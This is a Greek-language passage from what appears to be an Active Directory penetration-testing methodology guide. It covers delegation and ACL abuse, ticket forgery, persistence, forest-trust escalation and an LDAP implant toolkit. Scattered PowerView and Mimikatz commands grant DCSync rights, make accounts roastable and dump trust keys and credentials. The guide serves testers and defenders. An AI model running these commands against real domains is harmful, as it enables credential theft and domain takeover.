Χάρη στο constrained delegation θα μπορούσατε ακόμη και να **αυτόματα compromize έναν Print Server** (ελπίζοντας να είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Αν ένας χρήστης ή υπολογιστής επιτρέπεται για "Constrained Delegation", θα μπορεί να **impersonate οποιονδήποτε χρήστη για να έχει πρόσβαση σε κάποιες υπηρεσίες σε έναν υπολογιστή**.\  
Έπειτα, αν **compromise το hash** αυτού του χρήστη/υπολογιστή θα μπορείτε να **impersonate οποιονδήποτε χρήστη** (ακόμα και domain admins) για να έχετε πρόσβαση σε κάποιες υπηρεσίες.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή του δικαιώματος **WRITE** σε ένα Active Directory αντικείμενο ενός απομακρυσμένου υπολογιστή επιτρέπει την επίτευξη code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ο compromized χρήστης μπορεί να έχει κάποια **ενδιαφέροντα προνόμια πάνω σε αντικείμενα του domain** που θα σας επιτρέψουν να **μετακινηθείτε lateral/να αυξήσετε προνόμια**.

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Η ανακάλυψη μιας **Spool υπηρεσίας που ακούει** μέσα στο domain μπορεί να **abused** για να **αποκτήσετε νέες credentials** και να **αυξήσετε προνόμια**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Αν **άλλοι χρήστες** **access** τον **compromised** υπολογιστή, είναι πιθανό να **συλλέξετε credentials από τη μνήμη** και ακόμα να **inject beacons στις διεργασίες τους** για να τους impersonate.\  
Συνήθως οι χρήστες θα εισέρχονται μέσω RDP, οπότε εδώ είναι πώς να πραγματοποιήσετε μερικές επιθέσεις πάνω σε τρίτες RDP συνεδρίες:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined υπολογιστές, εξασφαλίζοντας ότι είναι **τυχαίο**, μοναδικό και συχνά **αλλάζει**. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο για εξουσιοδοτημένους χρήστες. Με επαρκή δικαιώματα για πρόσβαση σε αυτά τα passwords, το pivoting σε άλλους υπολογιστές γίνεται δυνατό.

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Η **συλλογή certificates** από τον compromized υπολογιστή μπορεί να είναι ένας τρόπος για να αυξήσετε προνόμια μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Αν υπάρχουν **ευπάθεια templates** ρυθμισμένα, είναι πιθανό να τα abuse για να ανεβάσετε προνόμια:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Μόλις αποκτήσετε **Domain Admin** ή ακόμα καλύτερα **Enterprise Admin** προνόμια, μπορείτε να **dump** τη **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Μερικές από τις τεχνικές που συζητήθηκαν παραπάνω μπορούν να χρησιμοποιηθούν για persistense.\  
Για παράδειγμα θα μπορούσατε:

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Η **Silver Ticket attack** δημιουργεί ένα **νόμιμο Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη υπηρεσία χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για να **έχετε πρόσβαση σε privileges της υπηρεσίας**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Μια **Golden Ticket attack** περιλαμβάνει έναν επιτιθέμενο που αποκτά πρόσβαση στο **NTLM hash του krbtgt account** σε ένα Active Directory (AD) περιβάλλον. Αυτός ο λογαριασμός είναι ειδικός γιατί χρησιμοποιείται για να υπογράφει όλα τα **Ticket Granting Tickets (TGTs)**, τα οποία είναι ουσιώδη για την authentication στο AD δίκτυο.

Μόλις ο επιτιθέμενος αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιονδήποτε λογαριασμό επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets που παραχαράσσονται με τρόπο που **παρακάμπτει κοινούς μηχανισμούς ανίχνευσης golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Το **να έχεις certificates ενός λογαριασμού ή να μπορείς να τα ζητήσεις** είναι ένας πολύ καλός τρόπος για να παραμείνεις στον λογαριασμό του χρήστη (ακόμα και αν αλλάξει τον κωδικό):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates είναι επίσης δυνατή για να παραμείνεις με υψηλά προνόμια μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το αντικείμενο **AdminSDHolder** στο Active Directory εξασφαλίζει την ασφάλεια των **privileged groups** (όπως Domain Admins και Enterprise Admins) εφαρμόζοντας ένα στάνταρ **Access Control List (ACL)** σε αυτές τις ομάδες για να αποτρέψει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να εκμεταλλευτεί· αν ένας επιτιθέμενος τροποποιήσει το ACL του AdminSDHolder για να δώσει πλήρη πρόσβαση σε έναν κανονικό χρήστη, αυτός ο χρήστης αποκτά εκτεταμένο έλεγχο πάνω σε όλες τις privileged groups. Αυτό το μέτρο ασφάλειας, που έχει σκοπό την προστασία, μπορεί έτσι να αντιστραφεί επιτρέποντας μη δικαιολογημένη πρόσβαση αν δεν παρακολουθείται στενά.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Μέσα σε κάθε **Domain Controller (DC)** υπάρχει ένας **local administrator** λογαριασμός. Με την απόκτηση admin δικαιωμάτων σε μια τέτοια μηχανή, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας **mimikatz**. Έπειτα απαιτείται μια τροποποίηση registry για να **επιτρέψετε τη χρήση αυτού του password**, επιτρέποντας απομακρυσμένη πρόσβαση στον local Administrator λογαριασμό.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Μπορείτε να **δώσετε** κάποια **ειδικά δικαιώματα** σε έναν **χρήστη** πάνω σε συγκεκριμένα αντικείμενα του domain που θα του επιτρέψουν να **αυξήσει προνόμια στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Οι **security descriptors** χρησιμοποιούνται για να **αποθηκεύουν** τα **permissions** που έχει ένα **αντικείμενο** πάνω σε ένα **αντικείμενο**. Αν μπορείτε απλώς να κάνετε μια **μικρή αλλαγή** στο **security descriptor** ενός αντικειμένου, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα προνόμια πάνω σε αυτό το αντικείμενο χωρίς να χρειάζεται να είστε μέλος κάποιας privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να καθιερώσετε ένα **universal password**, δίνοντας πρόσβαση σε όλους τους domain λογαριασμούς.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\  
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στη μηχανή.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρεί έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε συγκεκριμένα αντικείμενα **χωρίς** να αφήνει logs σχετικά με τις **τροποποιήσεις**. Χρειάζεστε DA προνόμια και να είστε μέσα στο **root domain**.\  
Σημειώστε ότι αν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν αρκετά άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να αυξήσετε προνόμια αν έχετε **αρκετή άδεια για να διαβάσετε LAPS passwords**. Ωστόσο, αυτά τα passwords μπορούν επίσης να χρησιμοποιηθούν για **παραμονή (persistence)**.\  
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως την ασφάλεια-όριο. Αυτό σημαίνει ότι **το compromize ενός μεμονωμένου domain μπορεί δυνητικά να οδηγήσει στο compromize ολόκληρου του Forest**.

### Basic Information

Ένας [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφάλειας που επιτρέπει σε έναν χρήστη από ένα **domain** να έχει πρόσβαση σε resources σε άλλο **domain**. Δημιουργεί ουσιαστικά έναν σύνδεσμο μεταξύ των συστημάτων authentication των δύο domains, επιτρέποντας στη ροή των authentication ελέγχων να γίνεται ομαλά. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και κρατούν συγκεκριμένα **keys** μέσα στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, αν ένας χρήστης επιθυμεί να έχει πρόσβαση σε μια υπηρεσία σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket γνωστό ως **inter-realm TGT** από τον δικό του DC. Αυτό το TGT κρυπτογραφείται με ένα κοινό **key** που και τα δύο domains έχουν συμφωνήσει. Ο χρήστης στη συνέχεια παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να πάρει ένα service ticket (**TGS**). Μετά την επιτυχή επικύρωση του inter-realm TGT από τον DC του trusted domain, αυτός εκδίδει ένα TGS, δίνοντας στον χρήστη πρόσβαση στην υπηρεσία.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από τον **Domain Controller (DC1)** του.
2. Ο DC1 εκδίδει ένα νέο TGT αν ο client πιστοποιηθεί επιτυχώς.
3. Ο client ζητά έπειτα ένα **inter-realm TGT** από τον DC1, που είναι απαραίτητο για να έχει πρόσβαση σε resources στο **Domain 2**.
4. Το inter-realm TGT κρυπτογραφείται με ένα **trust key** κοινό μεταξύ DC1 και DC2 ως μέρος του two-way domain trust.
5. Ο client παίρνει το inter-realm TGT στο **Domain 2's Domain Controller (DC2)**.
6. O DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το κοινό trust key και, αν είναι έγκυρο, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 που ο client θέλει να προσπελάσει.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι κρυπτογραφημένο με το hash του account του server, για να αποκτήσει πρόσβαση στην υπηρεσία στο Domain 2.

### Different trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι μονομερές ή αμφίδρομο**. Στην επιλογή των 2 ways, και τα δύο domains εμπιστεύονται το ένα το άλλο, αλλά στη **1 way** σχέση εμπιστοσύνης, ένα από τα domains θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε μόνο να έχετε πρόσβαση σε πόρους μέσα στο trusting domain από το trusted**.

Αν το Domain A εμπιστεύεται το Domain B, το A είναι το trusting domain και το B είναι το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**· και στο **Domain B**, αυτό θα είναι ένα **Inbound trust**.

**Διαφορετικές σχέσεις εμπιστοσύνης**

- **Parent-Child Trusts**: Αυτό είναι μια κοινή ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα δύο-κατευθύνσεων transitive trust με το parent domain. Σημαίνει ουσιαστικά ότι τα authentication αιτήματα μπορούν να ρέουν ομαλά μεταξύ του parent και του child.
- **Cross-link Trusts**: Αναφέρονται ως "shortcut trusts," και δημιουργούνται μεταξύ child domains για να επιταχύνουν τις αναφορές. Σε πολύπλοκα forests, οι authentication παραπομπές συνήθως πρέπει να ταξιδέψουν έως τη ρίζα του forest και μετά κάτω στο target domain. Με τη δημιουργία cross-links, αυτή η διαδρομή κονταίνει, κάτι που είναι χρήσιμο σε γεωγραφικά διασκορπισμένα περιβάλλοντα.
- **External Trusts**: Αυτά ρυθμίζονται μεταξύ διαφορετικών, μη σχετιζόμενων domains και είναι από τη φύση τους non-transitive. Σύμφωνα με [Microsoft's documentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για πρόσβαση σε resources σε ένα domain εκτός του τρέχοντος forest που δεν συνδέεται με forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts εγκαθίστανται αυτόματα μεταξύ του forest root domain και ενός νεοπροστιθέμενου tree root. Αν και όχι τόσο συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και εξασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες βρίσκονται στον [Microsoft's guide](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτό το είδος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains, επίσης επιβάλλοντας SID filtering για να ενισχύσει τα μέτρα ασφάλειας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με μη-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι πιο εξειδικευμένα και εξυπηρετούν περιβάλλοντα που απαιτούν ενσωμάτωση με Kerberos-based συστήματα εκτός του Windows οικοσυστήματος.

#### Other differences in **trusting relationships**

- Μια σχέση trust μπορεί επίσης να είναι **transitive** (A trust B, B trust C, τότε A trust C) ή **non-transitive**.
- Μια σχέση trust μπορεί να ρυθμιστεί ως **bidirectional trust** (και τα δύο εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Attack Path

1. **Enumerate** τις σχέσεις εμπιστοσύνης
2. Έλεγχος αν κάποιος **security principal** (user/group/computer) έχει **access** σε resources του **άλλου domain**, ίσως μέσω ACE entries ή αν είναι σε groups του άλλου domain. Αναζητήστε **relationships across domains** (πιθανώς το trust δημιουργήθηκε γι' αυτό).
1. kerberoast σε αυτή την περίπτωση θα μπορούσε να είναι άλλη επιλογή.
3. **Compromise** τους **accounts** που μπορούν να **pivot** μέσω domains.

Οι επιτιθέμενοι μπορούν να αποκτήσουν πρόσβαση σε resources σε άλλο domain μέσω τριών κύριων μηχανισμών:

- **Local Group Membership**: Principals μπορεί να προστεθούν σε local groups σε μηχανές, όπως η ομάδα “Administrators” σε έναν server, δίνοντάς τους σημαντικό έλεγχο πάνω σε αυτή τη μηχανή.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι μέλη groups μέσα στο ξένο domain. Η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope της ομάδας.
- **Access Control Lists (ACLs)**: Principals μπορεί να αναφέρονται σε ένα **ACL**, ειδικά ως οντότητες σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένους πόρους. Για όσους θέλουν να εμβαθύνουν στους μηχανισμούς των ACLs, DACLs και ACEs, το whitepaper "[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)" είναι ανεκτίμητο πόρο.

### Find external users/groups with permissions

Μπορείτε να ελέγξετε **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρείτε foreign security principals στο domain. Αυτοί θα είναι user/group από **an external domain/forest**.

Μπορείτε να το ελέγξετε αυτό στο Bloodhound ή χρησιμοποιώντας powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για να enumerate domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, μία για _Child --> Parent_ και μία για _Parent_ --> _Child_.\
> Μπορείτε να δείτε ποιο χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Ανεβάστε τα προνόμια ως Enterprise admin στο child/parent domain εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση writeable Configuration NC

Είναι κρίσιμο να κατανοήσετε πώς μπορεί να εκμεταλλευτεί το Configuration Naming Context (NC). Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για δεδομένα διαμόρφωσης σε όλο το forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) εντός του forest, και οι writable DCs διατηρούν ένα εγγράψιμο αντίγραφο του Configuration NC. Για να εκμεταλλευτείτε αυτό, πρέπει να έχετε **SYSTEM privileges on a DC**, κατά προτίμηση σε child DC.

**Link GPO to root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες για τα sites όλων των domain-joined computers εντός του AD forest. Λειτουργώντας με SYSTEM privileges σε οποιονδήποτε DC, οι επιτιθέμενοι μπορούν να συνδέσουν GPOs με τα root DC sites. Αυτή η ενέργεια ενδέχεται να θέσει σε κίνδυνο το root domain χειραγωγώντας τις πολιτικές που εφαρμόζονται σε αυτά τα sites.

For in-depth information, one might explore research on [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research).

**Compromise any gMSA in the forest**

Ένας διανύοντας επιθέσεων στοχεύει privileged gMSAs εντός του domain. Το KDS Root key, απαραίτητο για τον υπολογισμό των passwords των gMSA, αποθηκεύεται μέσα στο Configuration NC. Με SYSTEM privileges σε οποιοδήποτε DC, είναι δυνατή η πρόσβαση στο KDS Root key και ο υπολογισμός των passwords για οποιοδήποτε gMSA σε όλο το forest.

Detailed analysis and step-by-step guidance can be found in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Complementary delegated MSA attack (BadSuccessor – abusing migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Additional external research: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Αυτή η μέθοδος απαιτεί υπομονή, αναμένοντας τη δημιουργία νέων privileged AD objects. Με SYSTEM privileges, ένας επιτιθέμενος μπορεί να τροποποιήσει το AD Schema ώστε να χορηγήσει σε οποιονδήποτε χρήστη πλήρη έλεγχο σε όλες τις κλάσεις. Αυτό μπορεί να οδηγήσει σε μη εξουσιοδοτημένη πρόσβαση και έλεγχο επί νεοδημιουργημένων AD objects.

Further reading is available on [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Το ADCS ESC5 vulnerability στοχεύει τον έλεγχο αντικειμένων Public Key Infrastructure (PKI) για τη δημιουργία ενός certificate template που επιτρέπει authentication ως οποιοσδήποτε χρήστης εντός του forest. Καθώς τα PKI objects βρίσκονται στο Configuration NC, ο συμβιβασμός ενός writable child DC επιτρέπει την εκτέλεση ESC5 attacks.

More details on this can be read in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In scenarios lacking ADCS, the attacker has the capability to set up the necessary components, as discussed in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).

### External Forest Domain - Μονόπλευρο (Inbound) ή αμφίδρομο
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
Σε αυτό το σενάριο **το domain σας εμπιστεύεται** από ένα εξωτερικό, δίνοντάς σας **απροσδιόριστα permissions** πάνω του. Θα χρειαστεί να βρείτε **which principals of your domain have which access over the external domain** και στη συνέχεια να προσπαθήσετε να το εκμεταλλευτείτε:

{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Εξωτερικό Forest Domain - One-Way (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
Σε αυτό το σενάριο **your domain** **is trusting** κάποιες **privileges** σε έναν **principal** από **different domains**.

Ωστόσο, όταν ένα **domain is trusted** από το trusting domain, το trusted domain **creates a user** με ένα **predictable name** που χρησιμοποιεί ως **password the trusted password**. Αυτό σημαίνει ότι είναι δυνατόν να **access a user from the trusting domain to get inside the trusted one** για να το απογραφήσετε και να προσπαθήσετε να αυξήσετε περισσότερα privileges:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Ένας άλλος τρόπος να συμβιβαστεί το trusted domain είναι να βρεθεί ένα [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) που δημιουργήθηκε στην **opposite direction** του domain trust (κάτι που δεν είναι πολύ συνηθισμένο).

Ένας ακόμα τρόπος να συμβιβαστεί το trusted domain είναι να περιμένετε σε μια μηχανή όπου ένας **user from the trusted domain can access** για να κάνει login μέσω **RDP**. Τότε, ο attacker θα μπορούσε να εγχύσει κώδικα στη διεργασία της RDP session και να **access the origin domain of the victim** από εκεί.\
Επιπλέον, αν ο **victim mounted his hard drive**, από τη διεργασία της **RDP session** ο attacker θα μπορούσε να αποθηκεύσει **backdoors** στον **startup folder of the hard drive**. Αυτή η τεχνική ονομάζεται **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Μείωση κατάχρησης domain trust

### **SID Filtering:**

- Ο κίνδυνος επιθέσεων που εκμεταλλεύονται το SID history attribute across forest trusts μειώνεται από το SID Filtering, το οποίο είναι ενεργοποιημένο εξ ορισμού σε όλα τα inter-forest trusts. Αυτό στηρίζεται στην υπόθεση ότι τα intra-forest trusts είναι ασφαλή, θεωρώντας το forest, αντί για το domain, ως το όριο ασφαλείας σύμφωνα με τη θέση της Microsoft.
- Ωστόσο, υπάρχει ένα πρόβλημα: το SID filtering μπορεί να διαταράξει εφαρμογές και την πρόσβαση χρηστών, οδηγώντας μερικές φορές στην απενεργοποίησή του.

### **Selective Authentication:**

- Για inter-forest trusts, η χρήση του Selective Authentication εξασφαλίζει ότι οι users από τα δύο forests δεν πιστοποιούνται αυτόματα. Αντίθετα, απαιτούνται ρητές άδειες για τους users για να έχουν πρόσβαση σε domains και servers εντός του trusting domain ή forest.
- Είναι σημαντικό να σημειωθεί ότι αυτά τα μέτρα δεν προστατεύουν από την εκμετάλλευση του writable Configuration Naming Context (NC) ή από επιθέσεις στον trust account.

[**More information about domain trusts in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-based AD Abuse from On-Host Implants

The [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) επανεφαρμόζει bloodyAD-style LDAP primitives ως x64 Beacon Object Files που τρέχουν εξ ολοκλήρου μέσα σε ένα on-host implant (π.χ., Adaptix C2). Οι operators compile το πακέτο με `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, φορτώνουν `ldap.axs`, και στη συνέχεια καλούν `ldap <subcommand>` από το beacon. Όλη η κίνηση χρησιμοποιεί το τρέχον logon security context πάνω σε LDAP (389) με signing/sealing ή LDAPS (636) με auto certificate trust, οπότε δεν απαιτούνται socks proxies ή artifacts στο δίσκο.

### Implant-side LDAP enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups`, και `get-groupmembers` επιλύουν short names/OU paths σε πλήρη DNs και εκτυπώνουν τα αντίστοιχα αντικείμενα.
- `get-object`, `get-attribute`, και `get-domaininfo` τραβούν αυθαίρετα attributes (συμπεριλαμβανομένων security descriptors) καθώς και τα forest/domain metadata από το `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation`, και `get-rbcd` αποκαλύπτουν roasting candidates, delegation settings, και υπάρχοντες Resource-based Constrained Delegation descriptors απευθείας από LDAP.
- `get-acl` και `get-writable --detailed` αναλύουν την DACL για να απαριθμήσουν trustees, rights (GenericAll/WriteDACL/WriteOwner/attribute writes), και inheritance, δίνοντας άμεσα targets για ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP πρωτότυπα εγγραφής για escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) επιτρέπουν στον χειριστή να τοποθετήσει νέους principals ή machine accounts όπου υπάρχουν δικαιώματα OU. `add-groupmember`, `set-password`, `add-attribute`, και `set-attribute` καταλαμβάνουν άμεσα στόχους μόλις βρεθούν δικαιώματα write-property.
- Εντολές εστιασμένες σε ACL όπως `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite`, και `add-dcsync` μεταφράζουν WriteDACL/WriteOwner σε οποιοδήποτε AD αντικείμενο σε επαναρρυθμίσεις password, έλεγχο membership ομάδων, ή προνόμια DCSync replication χωρίς να αφήνουν PowerShell/ADSI artifacts. Οι αντίστοιχες `remove-*` εντολές καθαρίζουν τα εγχυμένα ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` κάνουν άμεσα έναν συμβιβασμένο χρήστη Kerberoastable; `add-asreproastable` (UAC toggle) τον χαρακτηρίζει για AS-REP roasting χωρίς να αγγίξει το password.
- Delegation macros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) επαναγράφουν `msDS-AllowedToDelegateTo`, UAC flags, ή `msDS-AllowedToActOnBehalfOfOtherIdentity` από το beacon, επιτρέποντας constrained/unconstrained/RBCD attack paths και εξαλείφοντας την ανάγκη για remote PowerShell ή RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` εγχέει privileged SIDs στο SID history ενός ελεγχόμενου principal (βλ. [SID-History Injection](sid-history-injection.md)), παρέχοντας κρυφή κληρονομιά πρόσβασης πλήρως μέσω LDAP/LDAPS.
- `move-object` αλλάζει το DN/OU των computers ή users, επιτρέποντας σε attacker να μεταφέρει assets σε OUs όπου υπάρχουν ήδη delegated rights προτού καταχραστεί `set-password`, `add-groupmember`, ή `add-spn`.
- Εντολές στενού εύρους για αφαίρεση (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, κ.λπ.) επιτρέπουν γρήγορο rollback αφού ο χειριστής συλλέξει credentials ή persistence, ελαχιστοποιώντας την τηλεμετρία.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Κάποιες Γενικές Άμυνες

[**Μάθετε περισσότερα για το πώς να προστατέψετε credentials εδώ.**](../stealing-credentials/credentials-protections.md)

### **Μέτρα Άμυνας για την Προστασία Credentials**

- **Domain Admins Restrictions**: Συνίσταται οι Domain Admins να επιτρέπεται να συνδέονται μόνο σε Domain Controllers, αποφεύγοντας τη χρήση τους σε άλλους hosts.
